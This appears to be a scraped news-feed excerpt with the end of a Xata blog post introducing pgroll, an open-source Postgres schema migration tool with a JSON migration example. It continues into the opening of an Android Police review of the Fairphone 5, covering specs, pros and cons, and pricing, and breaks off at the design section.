<ul role="list"><li><strong>Breaking changes</strong>: One of the fundamental issues plaguing schema migrations is the potential for breaking changes. Altering the database schema can have far-reaching consequences, causing disruptions and errors in applications that depend on it.</li><li><strong>Multiple steps</strong>: Database migrations are rarely a one-and-done affair. They often involve a series of intricate steps that need to be executed meticulously. Managing these multiple steps is usually not part of the team deployment workflow, and can quickly become a logistical nightmare (e.g. It can take <a href="https://xata.io/blog/postgres-schema-changes-pita#application-deploys-and-the-6-stages-of-rename">6 steps to rename a column</a> without downtime)!</li><li><strong>Unexpected database locks</strong>: Traditional migration methods can cause unexpected database locks, bringing services to a grinding halt and causing application downtime.</li><li><strong>No easy rollbacks</strong>: In the world of schema migrations, the safety net is often full of holes. Rolling back to a previous state in the event of a migration gone awry is rarely straightforward and is frequently a risky endeavor.</li></ul>
<p>Due to these issues, many developers choose to avoid complex migrations and only make additive changes. This leads to the accumulation of <strong>technical debt in the database schema</strong>, such as orphaned columns or missing constraints.</p>

<div><p><a href="https://github.com/xataio/mdx-blog/raw/main/images/introducing-pgroll-banner@2x.jpg"><img alt="pgroll banner" loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=640&amp;q=75 640w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=750&amp;q=75 750w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=828&amp;q=75 828w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=1080&amp;q=75 1080w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=1200&amp;q=75 1200w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=1920&amp;q=75 1920w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=2048&amp;q=75 2048w, https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=3840&amp;q=75 3840w" src="https://xata.io/_next/image?url=https%3A%2F%2Fgithub.com%2Fxataio%2Fmdx-blog%2Fraw%2Fmain%2Fimages%2Fintroducing-pgroll-banner%402x.jpg&amp;w=3840&amp;q=75"></a></p></div>
<p>At Xata, we use Postgres for our internal systems and to host our users' data. As a result, we need to perform migrations for both our internal development and from the Xata product itself.</p>
<p>We believe evolving your Postgres schema can be a considerably better experience:</p>
<ul role="list"><li>Migrations should not entail risks</li><li>Migrations should be easy to define, easy to execute</li><li>Migrations should be part of the normal deployment workflow (continuous delivery)</li><li>Migrations should be easily &amp; quickly reversible</li><li>Migrations should not require special orchestration</li></ul>
<p>This is why we created <code>pgroll</code>: <a href="https://github.com/xataio/pgroll">https://github.com/xataio/pgroll</a></p>
<p><code>pgroll</code> is an open source command-line tool for performing schema migrations against Postgres databases. Designed on these principles, <code>pgroll</code> allows users to define schema migrations using a high-level JSON format and then takes care of executing them. These are some of the key features:</p>
<ul role="list"><li><strong>Migrations are defined in a high-level JSON format</strong>: Simple definition, allowing for richer operations information on top of Postgres DDL statements (<code>CREATE</code>, <code>ALTER</code>, etc.)</li><li><strong>Keep two versions of the schema (previous and next) accessible at the same time during the whole migration process</strong>: Previous versions of the applications will still work while the migration is happening, taking risk and pressure away from the deployment process.</li><li><strong>Instant rollbacks</strong>: Since the previous version of the schema is kept alive, a rollback basically means canceling the migration; the previous schema never went away!</li><li><strong>Zero downtime</strong>: All operations are implemented to ensure that Postgres won’t lock data access to the table while the schema changes are happening.</li></ul>

<p><code>pgroll</code> uses the <a href="https://openpracticelibrary.com/practice/expand-and-contract-pattern/">expand and contract pattern</a> to evolve the database schema, automating its whole lifecycle behind an easy-to-use command line interface.</p>
<p>Previous and new versions of the schema are made available as “virtual” schemas on top of the Postgres physical one. By leveraging table views pointing to the right columns, <code>pgroll</code> is able to expose new parts of the schema and hide the old parts before safely removing them after the migration is completed.</p>
<div><p><a href="https://xata.io/mdx/blog/pgroll-migration-flow.svg"><img alt="pgroll multiple active versions, client applications rollout" loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=640&amp;q=75 640w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=750&amp;q=75 750w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=828&amp;q=75 828w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=1080&amp;q=75 1080w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=1200&amp;q=75 1200w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=1920&amp;q=75 1920w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=2048&amp;q=75 2048w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=3840&amp;q=75 3840w" src="https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-flow.svg&amp;w=3840&amp;q=75"></a></p><p><figcaption>pgroll multiple active versions, client applications rollout</figcaption></p></div>
<p>As discussed in <a href="https://xata.io/blog/postgres-schema-changes-pita#locking-gotchas">a previous blog post</a>, ensuring Postgres locks on tables (i.e. <code>ACCESS EXCLUSIVE</code>) while executing DDL statements don’t end up in data access blocking is possible. <code>pgroll</code> implements all migration operations using the right techniques to avoid this situation, so you don’t need to think about it.</p>
<p>Backfilling data is also a big part of performing backwards-compatible schema changes. <code>pgroll</code> takes care of performing automatic backfills when they are needed, abstracting the problem away while keeping things transparent.</p>
<p>Let’s show how <code>pgroll</code> works using an example. For instance, a typically complex migration would be to update a column to add a <code>NOT NULL</code> constraint to an existing column, while still allowing existing client applications to work without changes, providing time for devs to update them after the migration as part of their normal workflow. Other similar migrations that would typically result in breaking changes on the schema could be renaming a column, adding or removing constraints, setting <code>UNIQUE</code>... all of them supported by <code>pgroll</code>.</p>
<div><p><a href="https://xata.io/mdx/blog/pgroll-migration-schemas.svg"><img alt="pgroll virtual schemas during a migration" loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=640&amp;q=75 640w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=750&amp;q=75 750w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=828&amp;q=75 828w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=1080&amp;q=75 1080w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=1200&amp;q=75 1200w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=1920&amp;q=75 1920w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=2048&amp;q=75 2048w, https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=3840&amp;q=75 3840w" src="https://xata.io/_next/image?url=%2Fmdx%2Fblog%2Fpgroll-migration-schemas.svg&amp;w=3840&amp;q=75"></a></p><p><figcaption>pgroll virtual schemas during a migration</figcaption></p></div>
<p>This defines the migration for setting a column as <code>NOT NULL</code> using <code>pgroll</code>. Additional operations can be included in the same migration, but we'll focus on this one for simplicity:</p>
<div role="group" data-rehype-pretty-code-fragment=""><pre data-theme="default" tabindex="0" data-language="json"><code><span data-line=""><span>{</span></span>
<span data-line=""><span>  </span><span>"</span><span>name</span><span>"</span><span>:</span><span> </span><span>"</span><span>review_not_null</span><span>"</span><span>,</span></span>
<span data-line=""><span>  </span><span>"</span><span>operations</span><span>"</span><span>:</span><span> </span><span>[</span></span>
<span data-line=""><span>    </span><span>{</span></span>
<span data-line=""><span>      </span><span>"</span><span>alter_column</span><span>"</span><span>:</span><span> </span><span>{</span></span>
<span data-line=""><span>        </span><span>"</span><span>table</span><span>"</span><span>:</span><span> </span><span>"</span><span>reviews</span><span>"</span><span>,</span></span>
<span data-line=""><span>        </span><span>"</span><span>column</span><span>"</span><span>:</span><span> </span><span>"</span><span>review</span><span>"</span><span>,</span></span>
<span data-line=""><span>        </span><span>"</span><span>not_null</span><span>"</span><span>:</span><span> </span><span>true</span><span>,</span></span>
<span data-line=""><span>        </span><span>"</span><span>up</span><span>"</span><span>:</span><span> </span><span>"</span><span>(SELECT CASE WHEN review IS NULL THEN product || ' is good' ELSE review END)</span><span>"</span><span>,</span></span>
<span data-line=""><span>        </span><span>"</span><span>down</span><span>"</span><span>:</span><span> </span><span>"</span><span>review</span><span>"</span></span>
<span data-line=""><span>      </span><span>}</span></span>
<span data-line=""><span>    </span><span>}</span></span>
<span data-line=""><span>  </span><span>]</span></span>
<span data-line=""><span>}</span></span></code></pre></div>
<p>This is executed by running this simple command:</p>
<div role="group" data-rehype-pretty-code-fragment=""><pre data-theme="default" tabindex="0" data-language="bash"><code><span data-line=""><span>pgroll</span><span> </span><span>start</span><span> </span><span>review_not_null.json</span></span></code></pre></div>
<p><code>pgroll</code> will perform all the necessary steps to make this change available without disrupting existing client applications (the expand step from the <a href="https://openpracticelibrary.com/practice/expand-and-contract-pattern/">expand/contract pattern</a>). In this particular example, it will:</p>
<ul role="list"><li>Create a new column as a copy of the <code>review</code> column that respects the <code>NOT NULL</code> constraint.</li><li>Add the <code>NOT NULL</code> constraint to the new column, using the <code>NOT VALID</code> clause to ensure that data access doesn’t block due to this statement, avoiding unexpected downtime.</li><li>Backfill all existing values from the old column into the new one, upgrading the data in the cases where the value was <code>NULL</code>, based on the user-defined function. Of course, backfill happens in batches, avoiding excessively large updates that could also block the database.</li><li>Set up a trigger function so new inserts &amp; updates get automatically copied between the new and the old columns.</li><li>Keep the old column working at all times, ensuring the migration can be rolled back instantly if needed.</li><li>Create a new view of the schema that hides the old column and promotes the new one in its place, exposing this way the new version of the schema while the old one keeps working.</li></ul>
<p>Typically, all of these steps would require manual execution to achieve a complex update like this. However, <code>pgroll</code> streamlines the process by performing all of them with a single command ✨.</p>
<p>Once you are happy with the new version of the schema and all clients have been updated to use it, the old schema will no longer be accessed. It’s time to complete the migration (contract the schema) to get rid of the old column &amp; triggers:</p>

<p>For more complex examples, there is a wide range of schema migration samples in our <a href="https://github.com/xataio/pgroll/tree/main/examples">examples</a> and <a href="https://github.com/xataio/pgroll/tree/main/docs">docs</a>.</p>

<p>Today, we are rolling out the first version of <code>pgroll</code> and we are looking forward to your feedback! We plan to continue developing <code>pgroll</code> and exploring how it can make it easier and safer for Xata users to evolve their schema.</p>
<p>If you have any suggestions or questions, please open an issue in our <a href="https://github.com/xataio/pgroll">GitHub repo</a>, reach out to us on <a href="https://xata.io/discord">Discord</a> or follow us on <a href="https://twitter.com/xata">X / Twitter</a>. We'd love to hear from you and keep you up to date with the latest progress on <code>pgroll</code>.</p>
<p>Let’s start rolling!</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fairphone 5 review: The most uncompromising repairable phone yet (151 pts)]]></title>
            <link>https://www.androidpolice.com/fairphone-5-review/</link>
            <guid>37751924</guid>
            <pubDate>Tue, 03 Oct 2023 13:50:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.androidpolice.com/fairphone-5-review/">https://www.androidpolice.com/fairphone-5-review/</a>, See on <a href="https://news.ycombinator.com/item?id=37751924">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                
            <article>

        
                
    
        
    
                   <header>
                                                       <div>
                    


        

            <nav>
            <ul>
                <li><a href="https://www.androidpolice.com/">Home</a></li>
                                                                            <li><a href="https://www.androidpolice.com/phones/">Phones</a></li>
                                                                                <li><a href="https://www.androidpolice.com/phones-reviews/">Phones &amp; Accessory Reviews</a></li>
                                                                                                                                </ul>
        </nav>
    
                </div>
                            

    
            
    
        
            
    
    
    
        
    
                            






            
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                
    <p>Fairphone learned all the right lessons from its previous phones</p>

            
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                
                                    
                                                                                                                        
                                                <div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null">

        <figure>
            <picture>
                <!--[if IE 9]>
                <video style="display: none;"><![endif]-->
                                    <source media="(min-width: 1024px)" sizes="1140px" srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg?q=50&amp;fit=contain&amp;w=1140&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 768px)" sizes="943px" srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg?q=50&amp;fit=contain&amp;w=943&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 481px)" sizes="767px" srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg?q=50&amp;fit=contain&amp;w=767&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 0px)" sizes="480px" srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg?q=50&amp;fit=contain&amp;w=480&amp;h=&amp;dpr=1.5">
                                <!--[if IE 9]></video><![endif]-->
                                    <img width="2048" height="1365" alt="fairphone-5-back-on-window" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-window.jpg">
                            </picture>
            <figcaption></figcaption>
        </figure>
    </div>

    
            <!-- No winning ad found for zone: below main pic! -->
        
            
            

    
    
        
    
            
                    </header>

                            

                    
                                                        
            
            
    
                                    
            
    
    
                                                                            
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
                                                    
                        
    
                                                        
                                                                                                                                    
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                                                    
                                                
            
        
    
                                                                                
                                

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                                                                                                                                                                                                        
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
                                                        
                                
                                
                                                
            
        
    
                                                                                
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                                                                
            

    

    
    
                
    <div id="article-body" itemprop="articleBody">
<p>Fairphone is probably <em>the </em>company most associated with repairable and environmentally friendly phones, no matter how much Apple and Google want to tell you their <a href="https://www.androidpolice.com/best-android-phones/">latest and greatest smartphones</a> are green. The new Fairphone 5 is more than just a repairable phone, though. For the first time, the company's latest smartphone looks like a product that fits the year it was released in, with a modern design and display combining a device that can be easily fully disassembled.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":0,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":0,"nbrPlacementsScanned":0,"ruleCount":10,"degradationStartingPoint":2,"actualCount":477} -->
<!-- Zone: below first paragraph. -->
<!-- No ads allowed! -->
<!-- No winning ad found for zone: mid intro! -->
<p>The Fairphone 5 certainly <a href="https://www.androidpolice.com/fairphone-looking-forward-to-repairable-future-hands-on/">manages to turn eyes with its first impressions</a>, but how does it hold up over a longer period of time? I set out to find out just that when preparing to write my full review, so read on to learn if this eco-focused phone is really as good as we all hope it is.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":0,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":0,"nbrPlacementsScanned":1,"ruleCount":10,"degradationStartingPoint":2,"actualCount":286} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":1,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":1,"ruleCount":10,"degradationStartingPoint":2,"actualCount":0} -->
<div><div><div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg" data-img-desc="&quot;Source: Fairphone&quot;" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="&quot;&quot;"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="320px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=320&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="400px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=400&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="300px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=300&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2741" height="2741" alt="fairphone-5-tag-image" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg"> </picture> </figure> </div><p>Source: Fairphone</p> </div><div> <h5> Fairphone 5 </h5><p>The Fairphone 5 is the phone to choose if you value repairability and environmental responsibility above everything, but it may not be easy to come by in the US. It's possible that the company will launch it soon, though, maybe in the form of a cooperation with Murena, like it did with the Fairphone 4.</p><div> <dl><p> <dt><strong>SoC</strong></dt> <dd itemscope="" itemprop="SoC"> <span itemprop="name"> Qualcomm QCM 6490 </span> </dd> </p><p> <dt><strong>RAM</strong></dt> <dd itemscope="" itemprop="RAM"> <span itemprop="name"> 8GB </span> </dd> </p><p> <dt><strong>Storage</strong></dt> <dd itemscope="" itemprop="Storage"> <span itemprop="name"> 256GB </span> </dd> </p><p> <dt><strong>Battery</strong></dt> <dd itemscope="" itemprop="Battery"> <span itemprop="name"> 4,200mAh </span> </dd> </p><p> <dt><strong>Ports</strong></dt> <dd itemscope="" itemprop="Ports"> <span itemprop="name"> USB-C </span> </dd> </p><p> <dt><strong>Operating System</strong></dt> <dd itemscope="" itemprop="Operating System"> <span itemprop="name"> Android 13 </span> </dd> </p><p> <dt><strong>Front camera</strong></dt> <dd itemscope="" itemprop="Front camera"> <span itemprop="name"> 50MP </span> </dd> </p><p> <dt><strong>Rear camera</strong></dt> <dd itemscope="" itemprop="Rear camera"> <span itemprop="name"> 50MP IMX800 wide, 50MP IMX858 ultrawide </span> </dd> </p><p> <dt><strong>Connectivity</strong></dt> <dd itemscope="" itemprop="Connectivity"> <span itemprop="name"> 5G, Wi-Fi 6, Bluetooth 5.2 LE </span> </dd> </p><p> <dt><strong>Dimensions</strong></dt> <dd itemscope="" itemprop="Dimensions"> <span itemprop="name"> 161.60 x 75.83 x 9.6mm </span> </dd> </p><p> <dt><strong>Colors</strong></dt> <dd itemscope="" itemprop="Colors"> <span itemprop="name"> Transparent, black, blue </span> </dd> </p><p> <dt><strong>Weight</strong></dt> <dd itemscope="" itemprop="Weight"> <span itemprop="name"> 212g </span> </dd> </p><p> <dt><strong>Charge speed</strong></dt> <dd itemscope="" itemprop="Charge speed"> <span itemprop="name"> 30W </span> </dd> </p><p> <dt><strong>IP Rating</strong></dt> <dd itemscope="" itemprop="IP Rating"> <span itemprop="name"> IP55 </span> </dd> </p><p> <dt><strong>Price</strong></dt> <dd itemscope="" itemprop="Price"> <span itemprop="name"> €700, £620 </span> </dd> </p> </dl><!--<button type="button">See More</button>--> </div><div><div> <p><strong>Pros</strong></p><ul> <li>Longest software and hardware support window in the industry</li> <li>Only slightly bigger and bulkier than non-repairable phones</li> <li>Removable battery</li> <li>Fully repairable</li> </ul> </div><div> <p><strong>Cons</strong></p><ul> <li>Worse than average camera performance, particularly in low light</li> <li>Comparatively expensive</li> <li>The processor might not have enough oomph long-term</li> <li>Mediocre vibration motor and speakers</li> </ul> </div> </div> </div> </div>
<!-- No winning ad found for zone: native in content! -->
<h2 id="availability-network-and-pricing"> Availability, network, and pricing </h2>
<p>The Fairphone 5 is only available in Europe for now, available on the company's own website and a few other retailers. You can buy it for €700 or £650, which is roughly $750. That is more expensive than phones with comparable specs, but you're also buying a much longer support window, fairly sourced raw materials, and a repairable handset that introduces some unique design challenges.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":1,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":406} -->
<p>It’s possible that the Fairphone 5 will make the jump to the US in the future, though. <a href="https://www.androidpolice.com/murena-is-bringing-the-fairphone-to-the-us/">In a collaboration with Murena</a>, the Google-free Android ROM, the Fairphone 4 came to the US market just a few months ago, complete with the usual replacement parts. While it may take Fairphone a while, it's certainly possible that it will bring its new phone to the US sooner than later now that the infrastructure is in place. We can only hope that the company will offer customers the choice if they want to go Google-free or not — the Fairphone 4 is currently only offered without Google apps.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":1,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1005} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":2,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<h2 id="design-and-display"> Design and display </h2>
